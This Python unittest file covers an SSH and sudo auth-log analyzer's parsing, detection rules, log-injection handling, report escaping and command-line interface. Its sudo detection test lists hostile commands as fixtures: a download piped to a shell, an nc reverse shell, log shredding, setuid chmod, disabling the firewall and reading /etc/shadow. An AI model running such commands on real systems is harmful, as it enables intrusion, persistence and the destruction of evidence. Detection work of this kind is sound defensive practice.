import contextlib
import gzip
import io
import json
import re
import tempfile
import unittest
from datetime import datetime, timedelta
from pathlib import Path
from unittest import mock

from authtrail.__main__ import main
from authtrail.detections import (Thresholds, analyze, failed_attempts, is_internal,
                                  peak_distinct, peak_window)
from authtrail.parser import normalize_ip, parse_text
from authtrail.report import clean, to_dict, to_html, to_json, to_terminal

ROOT = Path(__file__).resolve().parent.parent
SAMPLES = ROOT / "samples"
BASE = datetime(2026, 10, 28, 3, 0, 0)


def stamp(seconds):
    t = BASE + timedelta(seconds=seconds)
    return f"{t:%b} {t.day:>2} {t:%H:%M:%S}"


def line(seconds, prog, msg, pid=100, host="h"):
    return f"{stamp(seconds)} {host} {prog}[{pid}]: {msg}"


def fail(seconds, ip, user="root", pid=None, invalid=False):
    who = f"invalid user {user}" if invalid else user
    return line(seconds, "sshd", f"Failed password for {who} from {ip} port 40000 ssh2", pid or 1000 + seconds)


def accept(seconds, ip, user="admin", method="password", pid=7000):
    return line(seconds, "sshd", f"Accepted {method} for {user} from {ip} port 50000 ssh2", pid)


def sudo(seconds, user, command):
    return f"{stamp(seconds)} h sudo:    {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND={command}"


def run(*lines, th=None):
    return analyze([parse_text("\n".join(lines), "t.log", year=2026)], th)


def rules(analysis):
    return [f.rule for f in analysis.findings]


def sample(name):
    return analyze([parse_text((SAMPLES / name).read_text(encoding="utf-8"), name, year=2026)])


class ParserTests(unittest.TestCase):
    def test_bsd_accept_with_key_fingerprint(self):
        (e,) = parse_text(accept(0, "192.0.2.7", method="publickey") + ": ED25519 SHA256:ab:cd",
                          year=2026).events
        self.assertEqual((e.kind, e.user, e.ip, e.method), ("ssh_accept", "admin", "192.0.2.7", "publickey"))
        self.assertEqual(e.ts, BASE)

    def test_rfc3339_offset_is_converted_to_utc(self):
        text = "2026-10-28T05:00:00.5+02:00 h sshd[9]: Failed password for root from 192.0.2.1 port 22 ssh2"
        (e,) = parse_text(text).events
        self.assertEqual(e.ts, datetime(2026, 10, 28, 3, 0, 0, 500000))

    def test_year_rolls_over_from_december_to_january(self):
        text = ("Dec 31 23:59:59 h sshd[1]: Failed password for root from 192.0.2.1 port 22 ssh2\n"
                "Jan  1 00:00:01 h sshd[2]: Failed password for root from 192.0.2.1 port 22 ssh2")
        a, b = parse_text(text, year=2026).events
        self.assertEqual((a.ts.year, b.ts.year), (2026, 2027))

    def test_inferred_year_is_never_in_the_future(self):
        # December logs read on January 5th belong to last year.
        text = "Dec 30 10:00:00 h sshd[1]: Failed password for root from 192.0.2.1 port 22 ssh2"
        (e,) = parse_text(text, now=datetime(2027, 1, 5)).events
        self.assertEqual(e.ts.year, 2026)

    def test_feb_29_parses(self):
        text = "Feb 29 10:00:00 h sshd[1]: Failed password for root from 192.0.2.1 port 22 ssh2"
        self.assertEqual(parse_text(text, year=2028).events[0].ts, datetime(2028, 2, 29, 10))

    def test_message_repeated_is_expanded(self):
        text = line(0, "sshd", "message repeated 4 times: [ Failed password for root from 192.0.2.1 port 22 ssh2]")
        events = parse_text(text, year=2026).events
        self.assertEqual(len(events), 4)
        self.assertTrue(all(e.kind == "ssh_fail" for e in events))

    def test_bom_and_crlf_are_harmless(self):
        text = "﻿" + fail(0, "192.0.2.1") + "\r\n" + fail(1, "192.0.2.1") + "\r\n"
        result = parse_text(text, year=2026)
        self.assertEqual(len(result.events), 2)
        self.assertEqual(result.unparsed, [])

    def test_openssh_98_sshd_session_program(self):
        text = f"{stamp(0)} h sshd-session[5]: Failed password for root from 192.0.2.1 port 22 ssh2"
        self.assertEqual(parse_text(text, year=2026).events[0].kind, "ssh_fail")

    def test_ip_normalization(self):
        self.assertEqual(normalize_ip("::ffff:192.0.2.7"), "192.0.2.7")
        self.assertEqual(normalize_ip("2001:DB8::1"), "2001:db8::1")
        self.assertEqual(normalize_ip("not-an-ip"), "")
        text = line(0, "sshd", "Failed password for root from evil.example port 22 ssh2")
        self.assertEqual(parse_text(text, year=2026).events, [])

    def test_sudo_command_containing_semicolons(self):
        text = (f"{stamp(0)} h sudo:      bob : 3 incorrect password attempts ; TTY=pts/1 ; "
                f"PWD=/tmp ; USER=root ; COMMAND=/bin/sh -c id ; whoami")
        (e,) = parse_text(text, year=2026).events
        self.assertEqual(e.kind, "sudo_badpass")
        self.assertEqual(e.detail["command"], "/bin/sh -c id ; whoami")
        self.assertEqual(e.detail["attempts"], 3)

    def test_account_change_lines(self):
        text = "\n".join([
            line(0, "useradd", "new user: name=x, UID=0, GID=0, home=/root, shell=/bin/bash, from=/dev/pts/1"),
            line(1, "usermod", "add 'x' to group 'sudo'"),
            line(2, "usermod", "add 'x' to shadow group 'sudo'"),
            line(3, "gpasswd", "user y added by admin to group docker"),
            line(4, "passwd", "pam_unix(passwd:chauthtok): password changed for x"),
            line(5, "su", "FAILED SU (to root) bob on pts/2"),
        ])
        kinds = [e.kind for e in parse_text(text, year=2026).events]
        self.assertEqual(kinds, ["user_add", "group_add", "group_add", "password_change", "su_fail"])

    def test_unrecognized_lines_are_counted(self):
        result = parse_text("hello\n" + fail(0, "192.0.2.1"), year=2026)
        self.assertEqual(result.unparsed, [1])
        self.assertEqual(result.recognized, 1)


class LogInjectionTests(unittest.TestCase):
    def test_username_cannot_spoof_the_source_address(self):
        # An attacker logs in as "x from 10.0.0.5 port 22 ssh2" to frame an internal host.
        msg = "Failed password for invalid user x from 10.0.0.5 port 22 ssh2 from 203.0.113.9 port 4242 ssh2"
        (e,) = parse_text(line(0, "sshd", msg), year=2026).events
        self.assertEqual(e.ip, "203.0.113.9")
        self.assertEqual(e.user, "x from 10.0.0.5 port 22 ssh2")

    def test_spray_sample_never_blames_the_framed_address(self):
        a = sample("03_spray_and_distributed.log")
        self.assertNotIn("10.0.0.5", [x.ip for x in a.attackers])


class WindowTests(unittest.TestCase):
    def events(self, offsets, users=None):
        return parse_text("\n".join(fail(s, "192.0.2.1", (users or {}).get(s, "root")) for s in offsets),
                          year=2026).events

    def test_peak_window(self):
        evs = self.events([0, 10, 20, 700, 710, 720, 730])
        n, win = peak_window(evs, timedelta(seconds=60))
        self.assertEqual(n, 4)
        self.assertEqual(win[0].ts, BASE + timedelta(seconds=700))

    def test_peak_distinct(self):
        evs = self.events([0, 1, 2, 3], users={0: "a", 1: "a", 2: "b", 3: "c"})
        self.assertEqual(peak_distinct(evs, timedelta(seconds=10), key=lambda e: e.user)[0], 3)

    def test_invalid_user_lines_are_not_double_counted(self):
        text = "\n".join([
            line(0, "sshd", "Invalid user bob from 192.0.2.1 port 1", pid=50),
            line(1, "sshd", "Failed password for invalid user bob from 192.0.2.1 port 1 ssh2", pid=50),
            line(2, "sshd", "Invalid user eve from 192.0.2.1 port 2", pid=51),   # key-only: no Failed line
        ])
        attempts = failed_attempts(parse_text(text, year=2026).events)
        self.assertEqual([(e.kind, e.user) for e in attempts],
                         [("ssh_fail", "bob"), ("ssh_invalid_user", "eve")])


class DetectionTests(unittest.TestCase):
    def test_brute_force_threshold_boundary(self):
        self.assertNotIn("ssh.bruteforce", rules(run(*[fail(i * 30, "203.0.113.5") for i in range(9)])))
        a = run(*[fail(i * 30, "203.0.113.5") for i in range(10)])
        self.assertEqual(rules(a), ["ssh.bruteforce"])
        self.assertEqual(a.verdict, "SUSPICIOUS")

    def test_brute_force_spread_beyond_the_window_is_ignored(self):
        self.assertEqual(rules(run(*[fail(i * 120, "203.0.113.5") for i in range(10)])), [])

    def test_spray(self):
        a = run(*[fail(i * 60, "203.0.113.5", user=f"u{i}", invalid=True) for i in range(8)])
        self.assertEqual(rules(a), ["ssh.spray"])
        self.assertEqual(a.attackers[0].label, "password spray")

    def test_distributed_attack(self):
        a = run(*[fail(i * 60, f"192.0.2.{i}", user="deploy") for i in range(5)])
        self.assertEqual(rules(a), ["ssh.distributed"])

    def test_compromise_after_failures(self):
        a = run(*[fail(i * 20, "203.0.113.5", user="admin") for i in range(5)], accept(200, "203.0.113.5"))
        self.assertEqual(a.findings[0].rule, "ssh.compromise")
        self.assertEqual(a.findings[0].severity, "critical")
        self.assertEqual(a.verdict, "COMPROMISE LIKELY")
        self.assertEqual(len(a.incidents), 1)

    def test_four_failures_then_success_is_a_typo_not_a_compromise(self):
        a = run(*[fail(i * 20, "10.0.0.7", user="admin") for i in range(4)], accept(200, "10.0.0.7"))
        self.assertEqual(a.incidents, [])

    def test_key_login_after_failures_is_high_not_critical(self):
        a = run(*[fail(i * 20, "203.0.113.5") for i in range(6)], accept(200, "203.0.113.5", method="publickey"))
        self.assertEqual([(f.rule, f.severity) for f in a.findings if f.rule == "ssh.compromise"],
                         [("ssh.compromise", "high")])

    def test_password_login_during_distributed_attack(self):
        attack = [fail(i * 60, f"192.0.2.{i}", user="deploy") for i in range(5)]
        self.assertIn("ssh.distributed_success", rules(run(*attack, accept(400, "10.0.0.9", user="deploy"))))
        # A CI system logging in with its key is not the attack succeeding.
        key = run(*attack, accept(400, "10.0.0.9", user="deploy", method="publickey"))
        self.assertNotIn("ssh.distributed_success", rules(key))

    def test_root_login(self):
        self.assertEqual([(f.rule, f.severity) for f in run(accept(0, "10.0.0.2", user="root")).findings],
                         [("ssh.root_login", "high")])

    def test_uid0_and_system_accounts(self):
        a = run(line(0, "useradd", "new user: name=x, UID=0, GID=0, home=/root, shell=/bin/bash"),
                line(1, "useradd", "new user: name=_apt, UID=105, GID=65534, home=/nonexistent, "
                                   "shell=/usr/sbin/nologin"))
        self.assertEqual([(f.rule, f.severity) for f in a.findings], [("account.uid0", "critical")])

    def test_privileged_groups_include_docker(self):
        a = run(line(0, "usermod", "add 'dev' to group 'docker'"), line(1, "usermod", "add 'dev' to group 'video'"))
        self.assertEqual(rules(a), ["account.priv_group"])

    def test_suspicious_sudo_commands(self):
        flagged = {
            "/usr/bin/bash -c curl -s http://x/a | sh": "Download piped into a shell",
            "/usr/bin/shred -u /var/log/auth.log": "Logs or shell history wiped",
            "/usr/bin/chmod 4755 /tmp/sh": "Setuid or setgid bit set",
            "/usr/bin/chmod u+s /tmp/sh": "Setuid or setgid bit set",
            "/usr/sbin/ufw disable": "Host firewall disabled",
            "/usr/bin/nc -e /bin/sh 203.0.113.5 4444": "Reverse shell command",
        }
        for command, title in flagged.items():
            with self.subTest(command=command):
                self.assertTrue(run(sudo(0, "admin", command)).findings[0].title.startswith(title))
        for benign in ["/usr/bin/tail -n 100 /var/log/syslog", "/usr/bin/chmod 755 /srv/app",
                       "/usr/bin/apt upgrade -y", "/usr/bin/journalctl -u nginx"]:
            with self.subTest(command=benign):
                self.assertEqual(run(sudo(0, "admin", benign)).findings, [])

    def test_activity_inside_an_incident_is_escalated(self):
        attack = [fail(i * 20, "203.0.113.5", user="admin") for i in range(5)]
        login = [accept(200, "203.0.113.5"),
                 line(200, "sshd", "pam_unix(sshd:session): session opened for user admin(uid=1000) by (uid=0)", 7000),
                 sudo(260, "admin", "/bin/bash"),
                 sudo(270, "carol", "/bin/bash"),       # another user: not part of the incident
                 line(600, "sshd", "pam_unix(sshd:session): session closed for user admin", 7000),
                 sudo(900, "admin", "/bin/bash")]       # after the session closed
        a = run(*attack, *login)
        shells = sorted((f.ts, f.user, f.severity, f.incident) for f in a.findings if f.rule == "sudo.command")
        self.assertEqual([(user, sev, inc) for _, user, sev, inc in shells],
                         [("admin", "medium", 1), ("carol", "low", None), ("admin", "low", None)])
        self.assertTrue(a.incidents[0].session_closed)

    def test_sudo_and_su_failures(self):
        a = run(*[f"{stamp(i)} h sudo:      bob : user NOT in sudoers ; TTY=pts/1 ; PWD=/ ; USER=root ; "
                  f"COMMAND=/bin/cat /etc/shadow" for i in range(2)],
                *[line(10 + i, "su", "FAILED su for root by eve") for i in range(3)])
        self.assertEqual(sorted(rules(a)), ["su.bruteforce", "sudo.denied"])

    def test_thresholds_are_configurable(self):
        attack = [fail(i * 30, "203.0.113.5") for i in range(5)]
        self.assertEqual(rules(run(*attack)), [])
        self.assertEqual(rules(run(*attack, th=Thresholds(brute_failures=5))), ["ssh.bruteforce"])

    def test_internal_ranges(self):
        self.assertTrue(is_internal("10.1.2.3"))
        self.assertTrue(is_internal("fd00::1"))
        self.assertFalse(is_internal("203.0.113.5"))    # documentation range, treated as external


class SampleTests(unittest.TestCase):
    def test_quiet_server_has_no_findings(self):
        a = sample("01_quiet_server.log")
        self.assertEqual(a.findings, [])
        self.assertEqual(a.verdict, "NO THREATS FOUND")
        self.assertEqual(a.iocs, {"ips": [], "accounts": [], "urls": []})

    def test_compromise_is_reconstructed(self):
        a = sample("02_bruteforce_compromise.log")
        self.assertEqual(a.verdict, "COMPROMISE LIKELY")
        self.assertEqual(a.stats["failed_logins"], 138)
        (inc,) = a.incidents
        self.assertEqual((inc.ip, inc.user, inc.session_closed), ("203.0.113.45", "admin", True))
        self.assertEqual(len(inc.findings), 8)
        self.assertEqual(a.iocs, {"ips": ["203.0.113.45", "198.51.100.12"], "accounts": ["sysadm"],
                                  "urls": ["http://198.51.100.77/payload.sh"]})
        # bob's refused sudo happens hours later from his own account: not part of the incident.
        denied = next(f for f in a.findings if f.rule == "sudo.denied")
        self.assertIsNone(denied.incident)
        self.assertIn("then logged in as 'admin'", a.summary)

    def test_spray_sample(self):
        a = sample("03_spray_and_distributed.log")
        self.assertEqual(a.verdict, "SUSPICIOUS")
        self.assertEqual(a.incidents, [])
        self.assertEqual(sorted(rules(a)), ["ssh.bruteforce", "ssh.distributed", "ssh.root_login",
                                            "ssh.spray", "ssh.spray"])
        self.assertIn("Username probing from 198.51.100.99", [f.title for f in a.findings])
        failures = {x.ip: x.failures for x in a.attackers}
        self.assertEqual((failures["198.51.100.23"], failures["198.51.100.99"]), (39, 10))

    def test_samples_match_the_generator(self):
        import tools.make_samples as gen
        with tempfile.TemporaryDirectory() as tmp, mock.patch.object(gen, "OUT", Path(tmp)), \
                contextlib.redirect_stdout(io.StringIO()):
            gen.quiet_server(), gen.compromise(), gen.spray()
            for f in Path(tmp).iterdir():
                with self.subTest(sample=f.name):
                    self.assertEqual(f.read_bytes(), (SAMPLES / f.name).read_bytes())


class ReportTests(unittest.TestCase):
    hostile = "<script>alert(1)</script>\x1b[2J"

    def analysis(self):
        return run(*[fail(i * 10, "203.0.113.5", user=self.hostile, invalid=True) for i in range(10)])

    def test_html_escapes_attacker_input_and_has_no_script(self):
        page = to_html(self.analysis())
        self.assertNotIn("<script", page)
        self.assertIn("&lt;script&gt;", page)
        self.assertNotIn("\x1b", page)

    def test_terminal_neutralizes_escape_sequences(self):
        out = to_terminal(self.analysis(), color=False)
        self.assertNotIn("\x1b", out)
        self.assertIn("\\x1b[2J", out)
        self.assertEqual(clean("a\x07b"), "a\\x07b")

    def test_ascii_fallback(self):
        out = to_terminal(sample("02_bruteforce_compromise.log"), color=False, fancy=False)
        out.encode("ascii")

    def test_json_is_complete_and_raw(self):
        data = json.loads(to_json(sample("02_bruteforce_compromise.log")))
        self.assertEqual(data["verdict"], "COMPROMISE LIKELY")
        self.assertEqual(data["iocs"]["urls"], ["http://198.51.100.77/payload.sh"])     # not defanged
        self.assertEqual(data["findings"][0]["mitre"][0]["id"], "T1110.001")
        self.assertEqual(len(data["incidents"][0]["findings"]), 9)
        self.assertEqual(to_dict(sample("01_quiet_server.log"))["findings"], [])


class CliTests(unittest.TestCase):
    def cli(self, *argv, stdin=None):
        out = io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(io.StringIO()), \
                mock.patch("sys.stdin", io.StringIO(stdin or "")):
            code = main(list(argv))
        return code, out.getvalue()

    def test_exit_codes(self):
        quiet, attack = str(SAMPLES / "01_quiet_server.log"), str(SAMPLES / "02_bruteforce_compromise.log")
        self.assertEqual(self.cli(quiet, "--year", "2026")[0], 0)
        self.assertEqual(self.cli(attack, "--year", "2026")[0], 1)
        self.assertEqual(self.cli(attack, "--year", "2026", "--fail-on", "never")[0], 0)
        self.assertEqual(self.cli(str(ROOT / "README.md"))[0], 2)     # not a log
        self.assertEqual(self.cli(str(ROOT / "missing.log"))[0], 2)

    def test_gzip_folder_and_stdin(self):
        with tempfile.TemporaryDirectory() as tmp:
            text = (SAMPLES / "02_bruteforce_compromise.log").read_bytes()
            (Path(tmp) / "auth.log.2.gz").write_bytes(gzip.compress(text))
            code, out = self.cli(tmp, "--year", "2026", "--json", "-")
        self.assertEqual(json.loads(out)["verdict"], "COMPROMISE LIKELY")
        code, out = self.cli("-", "--year", "2026", "--no-color",
                             stdin=(SAMPLES / "03_spray_and_distributed.log").read_text(encoding="utf-8"))
        self.assertEqual(code, 0)
        self.assertIn("SUSPICIOUS", out)


class HygieneTests(unittest.TestCase):
    def test_no_control_characters_in_source(self):
        # A shell edit once turned "\b" into a literal backspace in a sibling project;
        # a stray control byte silently breaks a regex without failing anything else.
        for path in list((ROOT / "authtrail").glob("*.py")) + list((ROOT / "tools").glob("*.py")):
            with self.subTest(file=path.name):
                bad = re.findall(r"[\x00-\x08\x0b-\x1f\x7f]", path.read_text(encoding="utf-8"))
                self.assertEqual(bad, [])


if __name__ == "__main__":
    unittest.main()
